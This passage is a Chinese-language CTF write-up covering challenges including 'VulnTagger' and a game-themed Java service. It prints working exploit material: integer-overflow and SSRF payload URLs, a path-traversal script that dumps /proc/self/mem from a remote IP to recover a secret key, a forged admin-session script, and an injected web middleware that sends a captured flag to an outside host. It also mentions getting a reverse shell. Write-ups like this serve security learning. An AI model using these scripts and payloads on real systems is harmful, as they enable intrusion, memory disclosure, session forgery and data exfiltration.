<p>利用链构造如上，需要注意的是咱们用代理区稳定触发一下getconnection，jackson调用getter是无参的。<br>我们再来看一下这道题的其他逻辑<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710840162526-7543efcf-a25a-4ad7-abc5-a45fd82b2b8f.png#averageHue=%23242529&clientId=u51b156d6-971a-4&from=paste&height=314&id=u06356c32&originHeight=628&originWidth=1300&originalType=binary&ratio=2&rotation=0&showTitle=false&size=133276&status=done&style=none&taskId=ue20d898b-bbb0-4a1c-9bd0-94dd85edb3a&title=&width=650" alt="image.png"><br>首先host不为空，然后player的level需要大于50，这一个逻辑我们来看一下<br>攻击者可以设置自己的防御力和其他属性，最后进入battle模式<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710840729197-63b43fb1-0880-4ad7-9fe0-9eec3a20ed9c.png#averageHue=%23242629&clientId=u51b156d6-971a-4&from=paste&height=534&id=u11844ec9&originHeight=1068&originWidth=1960&originalType=binary&ratio=2&rotation=0&showTitle=false&size=378854&status=done&style=none&taskId=uea689aaa-862d-4337-a502-1d92cd20eef&title=&width=980" alt="image.png"><br>假如赢了static块里的某个对象，就获取他的level，我们要获取的是flag的level。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710840821205-b092d39c-995e-4444-8072-396d0720fa23.png#averageHue=%231f2024&clientId=u51b156d6-971a-4&from=paste&height=681&id=u210143bc&originHeight=1362&originWidth=1528&originalType=binary&ratio=2&rotation=0&showTitle=false&size=185717&status=done&style=none&taskId=u912a1bc3-fd84-4bfd-9274-7661967825a&title=&width=764" alt="image.png"><br>属性设置这里有一些限制，这里其实凭借直觉就知道应该是整数溢出了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710841191384-b15dd7a9-0367-49af-9a5e-101055931e67.png#averageHue=%23c1c1c1&clientId=u51b156d6-971a-4&from=paste&height=225&id=ud07b59d2&originHeight=450&originWidth=1722&originalType=binary&ratio=2&rotation=0&showTitle=false&size=63234&status=done&style=none&taskId=ud494ba0b-34a1-4eaa-91f3-04dfa2fd155&title=&width=861" alt="image.png"><br>让防御为负数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710841286685-10517899-9798-4154-a2fc-e736be75ae98.png#averageHue=%232a2d33&clientId=u51b156d6-971a-4&from=paste&height=778&id=ua68bfc1e&originHeight=1556&originWidth=2638&originalType=binary&ratio=2&rotation=0&showTitle=false&size=591565&status=done&style=none&taskId=u25da39a5-28e8-42a1-be09-dd3c161e9c5&title=&width=1319" alt="image.png"><br>最后你可以发现返回的是0<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710841303144-7521696c-a87d-4d8e-aef3-e3800b0e0757.png#averageHue=%23292c31&clientId=u51b156d6-971a-4&from=paste&height=572&id=u81304641&originHeight=1144&originWidth=2066&originalType=binary&ratio=2&rotation=0&showTitle=false&size=259082&status=done&style=none&taskId=u7bf46a54-170b-46f2-a9d0-c9c90630491&title=&width=1033" alt="image.png"><br>成功levelup进入第一层逻辑<br>第二层就是个ssrf了，域名要包含dubhe，你可以是<code>dubhe.sudo.cc</code>,sudo.cc指向的是localhost，所以就可以了。<br>因此payload依次为</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8888/pal/cheat?defense=2147483647</span><br><span class="line">http://localhost:8888/pal/battle/flag</span><br><span class="line"></span><br><span class="line">http://localhost:8888/pal/cheat[post]</span><br><span class="line">host=dubhe.sudo.cc<span class="built_in">&amp;</span>data=base64</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710841583726-ba7b9fae-481e-4c38-b82a-0e57c8a3fca1.png#averageHue=%23a9a8a7&clientId=u51b156d6-971a-4&from=paste&height=1080&id=SLTgG&originHeight=2160&originWidth=3526&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1086079&status=done&style=none&taskId=u92eae285-940c-477d-9f3f-f9fb3211d77&title=&width=1763" alt="image.png"><br>最终可以rce。远程环境改为java bash反弹shell即可</p>
<h1 id="VulnTagger"><a href="#VulnTagger" class="headerlink" title="VulnTagger"></a>VulnTagger</h1><ul>
<li>代码审计</li>
<li>读mem拿key</li>
<li>pytorch inject RCE</li>
</ul>
<p>在做这道题之前首先需要去了解一下pytorch这东西，他是处理模型的，pytorch是有漏洞的。<br><a target="_blank" rel="noopener" href="https://github.com/trailofbits/fickling">https://github.com/trailofbits/fickling</a><br>他在加载模型的时候对数据会采用pickle反序列化。因此是有漏洞存在的。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710853320258-6073fbb0-aea8-4457-b003-87716943a690.png#averageHue=%23202124&clientId=u51b156d6-971a-4&from=paste&height=550&id=ucc842337&originHeight=1100&originWidth=2158&originalType=binary&ratio=2&rotation=0&showTitle=false&size=224053&status=done&style=none&taskId=u0935c2cb-cfb1-4039-98f3-884dd02ede4&title=&width=1079" alt="image.png"><br>一样的套路，有一个static任意文件读取接口。然后后半段其实挺明确了，利用pickle去执行python代码，但是需要管理员权限，需要个storage_key，这里套路和之前一样，是读取mem内存。<br>题目还给了个bot很奇怪</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line"><span class="keyword">from</span> logging <span class="keyword">import</span> getLogger</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> token_urlsafe</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Literal</span>, ParamSpec, TypeVar</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> httpx <span class="keyword">import</span> Client</span><br><span class="line"><span class="keyword">from</span> rich.logging <span class="keyword">import</span> RichHandler</span><br><span class="line"></span><br><span class="line">logger = getLogger(__name__)</span><br><span class="line">logger.addHandler(RichHandler())</span><br><span class="line">logger.setLevel(<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line">client = Client(base_url=<span class="string">&quot;http://localhost:8080&quot;</span>)</span><br><span class="line"></span><br><span class="line">_PS = ParamSpec(<span class="string">&quot;_PS&quot;</span>)</span><br><span class="line">_R = TypeVar(<span class="string">&quot;_R&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">catch_exception</span>(<span class="params">func: <span class="type">Callable</span>[_PS, _R]</span>) -&gt; <span class="type">Callable</span>[_PS, _R | <span class="type">Literal</span>[<span class="literal">False</span>]]:</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args: _PS.args, **kwargs: _PS.kwargs</span>) -&gt; _R | <span class="type">Literal</span>[<span class="literal">False</span>]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logger.exception(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@catch_exception</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate</span>(<span class="params">difficulty: <span class="built_in">int</span> = <span class="number">4</span>, token: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span></span>):</span><br><span class="line">    resp = client.post(</span><br><span class="line">        <span class="string">&quot;/&quot;</span>,</span><br><span class="line">        headers=&#123;</span><br><span class="line">            <span class="string">&quot;x-pow-token&quot;</span>: (token),</span><br><span class="line">            <span class="string">&quot;x-pow-difficulty&quot;</span>: <span class="built_in">str</span>(difficulty),</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">418</span>:</span><br><span class="line">        logger.debug(<span class="string">&quot;Failed to validate with status code %d&quot;</span>, resp.status_code)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data: <span class="built_in">str</span> = resp.json()[<span class="string">&quot;bar&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        logger.debug(<span class="string">&quot;Failed to validate with invalid JSON&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        hashlib.sha256(token.encode() + data.encode())</span><br><span class="line">        .hexdigest()</span><br><span class="line">        .startswith(<span class="string">&quot;0&quot;</span> * difficulty)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    difficulty = <span class="number">4</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> validate(difficulty):  <span class="comment"># noqa: SIM102</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(validate(difficulty) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(difficulty)):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        logger.info(<span class="string">&quot;Failed to validate with difficulty %d&quot;</span>, difficulty)</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">    logger.info(<span class="string">&quot;Successfully validated with difficulty %d&quot;</span>, difficulty)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> subprocess.Popen([<span class="string">&quot;/readflag&quot;</span>], stdout=subprocess.PIPE) <span class="keyword">as</span> proc:</span><br><span class="line">        <span class="keyword">assert</span> proc.stdout <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> proc.stdout:</span><br><span class="line">            flag = line.decode().strip()</span><br><span class="line">            validate(difficulty, flag)</span><br><span class="line">    logger.info(<span class="string">&quot;Flag submitted&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一开始我觉得这玩意儿意义不明的。开了个死循环进程，不断地去验证pow，假如通过了就直接把flag放到请求头里。在小伙伴们的思路下知道了是要我们注入一个niceui的middleware。与以往rce不同<br>这里直接放一下哥哥们的exp。<br>首先是读取mem中的信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#read_mem.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> maps_parser <span class="keyword">import</span> parse_proc_maps</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;/static%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fproc/self/mem&quot;</span></span><br><span class="line">maps = <span class="string">&quot;http://1.95.11.7:40721/static%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fproc/self/maps&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(maps)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">maps_parsed = parse_proc_maps(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.makedirs(<span class="string">&quot;./out&quot;</span>,exist_ok=<span class="literal">True</span>)</span><br><span class="line">os.system(<span class="string">&quot;rm out/*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">start_mem_int,end_mem_int</span>):</span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((<span class="string">&quot;1.95.11.7&quot;</span>, <span class="number">40721</span>)) <span class="keyword">as</span> sock:</span><br><span class="line">        request = <span class="string">f&quot;GET <span class="subst">&#123;url&#125;</span> HTTP/1.1\r\nHost: 1.95.11.7:40721\r\nUpgrade-Insecure-Requests: 1\r\nRange: bytes=<span class="subst">&#123;start_mem_int&#125;</span>-<span class="subst">&#123;end_mem_int&#125;</span>\r\nConnection: close\r\n\r\n&quot;</span></span><br><span class="line">        sock.sendall(request.encode())</span><br><span class="line">        response = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> t:=sock.recv(<span class="number">8192</span>):</span><br><span class="line">            response+=t</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span>  <span class="string">b&#x27;title&gt;VulnTagger&lt;/title&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response</span><br><span class="line">        <span class="keyword">return</span> response.split(<span class="string">b&quot;\r\n\r\n&quot;</span>,<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> maps_parsed:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> item.pathname != <span class="literal">None</span>: <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> item.perms != <span class="string">&quot;rw-p&quot;</span>:<span class="keyword">continue</span></span><br><span class="line">    start_mem_int,end_mem_int = <span class="built_in">int</span>(item.addr_start,<span class="number">16</span>),<span class="built_in">int</span>(item.addr_end,<span class="number">16</span>)</span><br><span class="line">    size = end_mem_int - start_mem_int</span><br><span class="line">    <span class="keyword">if</span> size &gt;= <span class="number">10</span>*<span class="number">1024</span>*<span class="number">1024</span>: <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(item.addr_start,item.addr_end,item.perms,size,size/<span class="number">1024</span>/<span class="number">1024</span>,<span class="string">&quot;MB&quot;</span>)</span><br><span class="line">    filename = <span class="string">f&#x27;<span class="subst">&#123;item.addr_start&#125;</span>_<span class="subst">&#123;item.addr_end&#125;</span>_<span class="subst">&#123;<span class="built_in">str</span>(item.pathname)&#125;</span>&#x27;</span>.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;_&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(filename)</span><br><span class="line">    outfile = os.path.join(<span class="string">&quot;./out&quot;</span>,filename)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(outfile,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        outfile.write(read(start_mem_int,end_mem_int))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>寻找key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#filter_strings.py</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">b64charset = string.ascii_letters + string.digits + <span class="string">&quot;_-&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isbase64safe</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(x <span class="keyword">in</span> b64charset <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;strings -n 22 out/* &gt; /tmp/strings.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./false_positives.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    false_positives = f.readlines()</span><br><span class="line">false_positives = <span class="built_in">list</span>(x.strip() <span class="keyword">for</span> x <span class="keyword">in</span> false_positives)</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/strings.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        l = line[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(l) == <span class="number">22</span> <span class="keyword">and</span> isbase64safe(l):</span><br><span class="line">            <span class="keyword">if</span> l <span class="keyword">not</span> <span class="keyword">in</span> false_positives:</span><br><span class="line">                result.add(l)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure>
<p>获取到key后就可以跑出session</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fake_session_server.py</span></span><br><span class="line"><span class="keyword">from</span> nicegui <span class="keyword">import</span> ui</span><br><span class="line"><span class="keyword">from</span> nicegui <span class="keyword">import</span> app</span><br><span class="line"></span><br><span class="line"><span class="meta">@ui.page(<span class="params"><span class="string">&#x27;/other_page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">other_page</span>():</span><br><span class="line">    app.storage.browser[<span class="string">&quot;is_admin&quot;</span>] = <span class="literal">True</span></span><br><span class="line">    ui.label(<span class="string">&#x27;Welcome to the other side&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ui.link(<span class="string">&#x27;Visit other page&#x27;</span>, other_page)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">secret_token=sys.argv[<span class="number">1</span>]</span><br><span class="line">ui.run(port=<span class="number">8082</span>,storage_secret=secret_token,show=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fake_session.py</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">secret_token=sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">p = subprocess.Popen([<span class="string">&quot;python3&quot;</span>,<span class="string">&quot;fake_session_server.py&quot;</span>,secret_token])</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://127.0.0.1:8082/other_page&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.cookies)</span><br><span class="line"></span><br><span class="line">p.terminate()</span><br></pre></td></tr></table></figure>
<p>写一个middleware，这个middleware要注入到进程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#antibot.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> logging <span class="keyword">import</span> getLogger</span><br><span class="line"><span class="keyword">from</span> nicegui <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> Request,Response</span><br><span class="line"><span class="keyword">from</span> starlette.middleware <span class="keyword">import</span> Middleware</span><br><span class="line"><span class="keyword">from</span> starlette.middleware.base <span class="keyword">import</span> BaseHTTPMiddleware</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">app.middleware_stack = <span class="literal">None</span></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&quot;http&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">add_process_time_header</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">difficulty, token</span>):</span><br><span class="line">        <span class="keyword">import</span> hashlib</span><br><span class="line">        <span class="keyword">from</span> logging <span class="keyword">import</span> getLogger</span><br><span class="line">        <span class="keyword">from</span> nicegui <span class="keyword">import</span> app</span><br><span class="line">        <span class="keyword">from</span> fastapi <span class="keyword">import</span> Request,Response</span><br><span class="line">        <span class="keyword">from</span> starlette.middleware <span class="keyword">import</span> Middleware</span><br><span class="line">        <span class="keyword">from</span> starlette.middleware.base <span class="keyword">import</span> BaseHTTPMiddleware</span><br><span class="line">        <span class="keyword">import</span> urllib</span><br><span class="line">        <span class="keyword">import</span> string</span><br><span class="line">        <span class="keyword">import</span> json</span><br><span class="line">        <span class="keyword">import</span> itertools</span><br><span class="line">        combinations = itertools.product(string.ascii_letters, repeat=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">for</span> combination <span class="keyword">in</span> combinations:</span><br><span class="line">            res = <span class="string">&quot;&quot;</span>.join(combination)</span><br><span class="line">            <span class="keyword">if</span> (hashlib.sha256((token + res).encode()).hexdigest().startswith(<span class="string">&quot;0&quot;</span>*difficulty)):</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">import</span> hashlib</span><br><span class="line">    <span class="keyword">from</span> logging <span class="keyword">import</span> getLogger</span><br><span class="line">    <span class="keyword">from</span> nicegui <span class="keyword">import</span> app</span><br><span class="line">    <span class="keyword">from</span> fastapi <span class="keyword">import</span> Request,Response</span><br><span class="line">    <span class="keyword">from</span> starlette.middleware <span class="keyword">import</span> Middleware</span><br><span class="line">    <span class="keyword">from</span> starlette.middleware.base <span class="keyword">import</span> BaseHTTPMiddleware</span><br><span class="line">    <span class="keyword">import</span> urllib</span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    <span class="keyword">import</span> json</span><br><span class="line">    <span class="keyword">import</span> itertools</span><br><span class="line">    logger = getLogger(<span class="string">&quot;injected&quot;</span>)</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    x_pow_token = request.headers.get(<span class="string">&quot;x-pow-token&quot;</span>)</span><br><span class="line">    x_pow_difficulty = request.headers.get(<span class="string">&quot;x-pow-difficulty&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> x_pow_token <span class="keyword">and</span> x_pow_difficulty:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> urllib.request.urlopen(<span class="string">&quot;http://1.1.1.1/x/flag/&quot;</span>+x_pow_token) <span class="keyword">as</span> response:</span><br><span class="line">              <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        logger.warning(<span class="string">&quot;pow: %s %s&quot;</span> %(x_pow_difficulty,x_pow_token))</span><br><span class="line">        <span class="built_in">pow</span> = proof_of_work(<span class="built_in">int</span>(x_pow_difficulty),x_pow_token)</span><br><span class="line">        logger.warning(<span class="string">&quot;calculated pow:%s&quot;</span>%<span class="built_in">pow</span>)</span><br><span class="line">        <span class="keyword">return</span> Response(json.dumps(&#123;<span class="string">&quot;bar&quot;</span>:<span class="built_in">pow</span>&#125;),<span class="number">418</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这样在死循环中就会识别pow然后中断，将flag放在token里。<br><a target="_blank" rel="noopener" href="https://github.com/mix-archive/VulnTagger?tab=readme-ov-file">https://github.com/mix-archive/VulnTagger?tab=readme-ov-file</a><br>官方给了docker，感觉还挺难的说实话。</p>
<h1 id="Master-of-Profile"><a href="#Master-of-Profile" class="headerlink" title="Master of Profile"></a>Master of Profile</h1><ul>
<li>wmctf2022的subconverter</li>
</ul>
